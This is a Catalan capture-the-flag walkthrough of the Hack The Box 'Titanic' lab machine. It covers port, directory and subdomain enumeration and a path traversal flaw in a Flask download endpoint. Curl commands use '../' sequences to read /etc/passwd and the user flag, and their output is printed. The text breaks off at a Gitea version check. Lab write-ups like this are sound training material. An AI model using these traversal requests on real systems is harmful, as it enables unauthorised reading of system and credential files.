Anirem directament al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:

```
                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -v 10.10.11.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 20:26 CET
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating Ping Scan at 20:26
Scanning 10.10.11.55 [4 ports]
Completed Ping Scan at 20:26, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:26
Completed Parallel DNS resolution of 1 host. at 20:26, 0.02s elapsed
Initiating SYN Stealth Scan at 20:26
Scanning 10.10.11.55 [1000 ports]
Discovered open port 80/tcp on 10.10.11.55
Discovered open port 22/tcp on 10.10.11.55
Completed SYN Stealth Scan at 20:26, 3.50s elapsed (1000 total ports)
Initiating Service scan at 20:26
Scanning 2 services on 10.10.11.55
Completed Service scan at 20:26, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.55.
Initiating NSE at 20:26
Completed NSE at 20:26, 1.50s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.17s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Nmap scan report for 10.10.11.55
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Initiating NSE at 20:26
Completed NSE at 20:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
           Raw packets sent: 1024 (45.032KB) | Rcvd: 1001 (40.048KB)


```

Trobem dos ports oberts, accés a una web pel port 80 i a la que tinguem unes credencials ens podrem connectar per SSH ja que també hi ha accés al port 22 que és el port ssh per defecte. Ara, per tant, afegirem al fitxer /etc/hosts aquesta IP i l'associarem al nom de domini titanic.htb. La web està feta com si es recreés la web del vaixell Titanic, es pot reservar el viatge, veure els serveis que ofereix, etc. La pàgina sembla que està en construcció ja que no van totes les funcionalitats que sembla tenir:

![image](https://github.com/user-attachments/assets/146b35a6-8f34-4b2d-bc43-caa1c4955a74)

Ara farem un wget/curl i un whatweb per veure que hi ha.

```
┌──(kali㉿kali)-[~]
└─$ whatweb http://titanic.htb   
http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]

```

Veiem la versió de Python que té entre d'altres coses.

Ara farem una enumeració de directoris a veure si trobem alguna cosa que ens pugui ser útil, i després farem una enumeració de subdominis:

Un dels directoris trobats és titanic.htb/download i sembla que es poden veure JSON fet a la hora de reservar ticket, potser es poden manipular i ens pot ser útil: 

![image](https://github.com/user-attachments/assets/1d6ba2ac-e18e-4c6e-81aa-ddadba95b05a)

És estrany però perquè fer una reserva se'ns desa un fitxer JSON amb les dades que hem emplenat. Els resultats de l'escaneig de directoris on tot ens retorna 400 i per tant no podem fer/veure res:

```    
┌──(kali㉿kali)-[~]
└─$ dirb http://titanic.htb /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Feb 23 20:41:25 2025
URL_BASE: http://titanic.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://titanic.htb/ ----
+ http://titanic.htb/book (CODE:405|SIZE:153)                                                                                   
+ http://titanic.htb/download (CODE:400|SIZE:41)                                                                                
+ http://titanic.htb/server-status (CODE:403|SIZE:276)                                                                          
                                                                                                                                
-----------------
END_TIME: Sun Feb 23 20:45:04 2025
DOWNLOADED: 4612 - FOUND: 3`
```

Ara farem un escaneig de subdominis a veure si trobem alguna cosa que ens sigui més útil:
 
```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u http://titanic.htb -H "Host:FUZZ.titanic.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 72ms]
:: Progress: [114606/114606] :: Job [1/1] :: 481 req/sec :: Duration: [0:03:05] :: Errors: 0 ::

```

Ara afegim dev.titanic.htb al fitxer /etc/hosts. Aquí ens trobem això:

![image](https://github.com/user-attachments/assets/c86b726a-44b9-4c74-bd23-d47dadcafee8)


Anem a explore i veiem que hi ha dos repos on potser hi podem trobar alguna vulnerabilitat:

![image](https://github.com/user-attachments/assets/c5f9fa9f-622a-4515-9f73-cf38c21043ee)


Al repo docker-config hi ha la contrasenya root de la BD:

![image](https://github.com/user-attachments/assets/37a0dd84-a6d5-4854-89f6-16cff4a8991c)


També hi ha un repo anomenat flask-app on hi ha un fitxer que es diu app.py, li pregunto al ChatGPT si hi ha alguna vulnerabilitat que podem utilitzar al codi:
```

|   |
|---|
|`from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response`|

|   |
|---|
|`import os`|

|   |
|---|
|`import json`|

|   |
|---|
|`from uuid import uuid4`|

|   |
|---|
||

|   |
|---|
|`app = Flask(__name__)`|

|   |
|---|
||

|   |
|---|
|`TICKETS_DIR = "tickets"`|

|   |
|---|
||

|   |
|---|
|`if not os.path.exists(TICKETS_DIR):`|

|   |
|---|
|`os.makedirs(TICKETS_DIR)`|

|   |
|---|
||

|   |
|---|
|`@app.route('/')`|

|   |
|---|
|`def index():`|

|   |
|---|
|`return render_template('index.html')`|

|   |
|---|
||

|   |
|---|
|`@app.route('/book', methods=['POST'])`|

|   |
|---|
|`def book_ticket():`|

|   |
|---|
|`data = {`|

|   |
|---|
|`"name": request.form['name'],`|

|   |
|---|
|`"email": request.form['email'],`|

|   |
|---|
|`"phone": request.form['phone'],`|

|   |
|---|
|`"date": request.form['date'],`|

|   |
|---|
|`"cabin": request.form['cabin']`|

|   |
|---|
|`}`|

|   |
|---|
||

|   |
|---|
|`ticket_id = str(uuid4())`|

|   |
|---|
|`json_filename = f"{ticket_id}.json"`|

|   |
|---|
|`json_filepath = os.path.join(TICKETS_DIR, json_filename)`|

|   |
|---|
||

|   |
|---|
|`with open(json_filepath, 'w') as json_file:`|

|   |
|---|
|`json.dump(data, json_file)`|

|   |
|---|
||

|   |
|---|
|`return redirect(url_for('download_ticket', ticket=json_filename))`|

|   |
|---|
||

|   |
|---|
|`@app.route('/download', methods=['GET'])`|

|   |
|---|
|`def download_ticket():`|

|   |
|---|
|`ticket = request.args.get('ticket')`|

|   |
|---|
|`if not ticket:`|

|   |
|---|
|`return jsonify({"error": "Ticket parameter is required"}), 400`|

|   |
|---|
||

|   |
|---|
|`json_filepath = os.path.join(TICKETS_DIR, ticket)`|

|   |
|---|
||

|   |
|---|
|`if os.path.exists(json_filepath):`|

|   |
|---|
|`return send_file(json_filepath, as_attachment=True, download_name=ticket)`|

|   |
|---|
|`else:`|

|   |
|---|
|`return jsonify({"error": "Ticket not found"}), 404`|

|   |
|---|
||

|   |
|---|
|`if __name__ == '__main__':`|

`app.run(host='127.0.0.1', port=5000)`

```


El ChatGTP diu el següent:

### **1️⃣ Directory Traversal en `/download`**

**Problema:**  
El paràmetre `ticket` que es passa a `/download` es concatena directament amb `TICKETS_DIR`, cosa que pot permetre un atac de **path traversal** (`../../etc/passwd` per exemple). Un atacant podria intentar accedir a fitxers fora del directori `tickets`.

**Solució:**

- Verificar que `ticket` només conté caràcters alfanumèrics i `.json`
- Fer servir `os.path.abspath()` per comprovar que el fitxer és realment dins `TICKETS_DIR`

Com que ens suggereix un atac utilitzant path_traversal a /etc/passwd a través del directori-endpoint /download és el primer que farem:

### **1️⃣ Prova d'explotació de Path Traversal**

L'endpoint `/download` permet especificar un fitxer mitjançant el paràmetre `ticket`. Si no hi ha validació adequada, es pot intentar accedir a fitxers sensibles:

#### **Intentar llegir `/etc/passwd` (en sistemes Linux)**

`curl "http://127.0.0.1:5000/download?ticket=../../../../etc/passwd"`

Si l'aplicació és vulnerable, això ens retornaria el contingut de `/etc/passwd`. Adaptem la comanda que ens passa el ChatGPT i la tirem afegint l'opció `--path-as-is` que evita que `curl` normalitzi els `..` en la URL, cosa que podria impedir l'explotació si el servidor intenta netejar o modificar el camí abans de processar-lo, però no sembla que hi hagi res interessant:

```
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false`
```

Ens retorna el fitxer /etc/passwd, per tant el path traversal funciona perfectament al no haver-hi una validació adequada. Amb això, veiem que hi ha un usuari anomenat developer, per tant tindrà lògica buscar la user flag a developer. Podem provar la comanda tant fent un curl per consola i veient el resultat:


Com a través de la URL, si ho fem a través de la URL ens descarrega un fitxer que podem llegir:

![image](https://github.com/user-attachments/assets/918507a4-9044-4431-9b92-c7c674b1c97b)


El que provaré serà fer una comanda per mirar d'aconseguir la user flag intentat aconseguir llegir el que hi ha d'haver a /home/developer/user.txt. Molt fàcil, com que havia funcionat la comanda que havia dit el ChatGPT ha estat molt fàcil fer funcionar la comanda per aconseguir la user flag, a la primera, ja que l'estructura dels directoris és que el /home està per defecte a l'arrel, igual que el directori /etc:


http://titanic.htb/download?ticket=../../../home/developer/user.txt

![image](https://github.com/user-attachments/assets/98e708db-2cea-4ada-bb3d-c65fa11630b5)



El mateix fet amb curl:

┌──(kali㉿kali)-[~]
└─$ curl --path-as-is http://titanic.htb/download?ticket=../../../home/developer/user.txt
24bf8635b9d318162e7c29ab1b83c4cb


Ja tenim al user flag!

Ara toca veure com podem accedir a la màquina per ssh i després escalar privilegis per aconseguir la root flag. 

Abans al fer l'escaneig de subdominis hem trobat el subdomini dev.titanic.htb. Segurament allà podrem trobar estirar alguna cosa que ens permeti accedir a la màquina:

A sota de tot de la pàgina hi ha la versió de Gitea, per tant el primer que fem és buscar si té algun CVE o POC:

![image](https://github.com/user-attachments/assets/825d5d4d-0f7e-498f-a796-2c0189e62fae)


Impulsado por Gitea Versión: 1.22.1





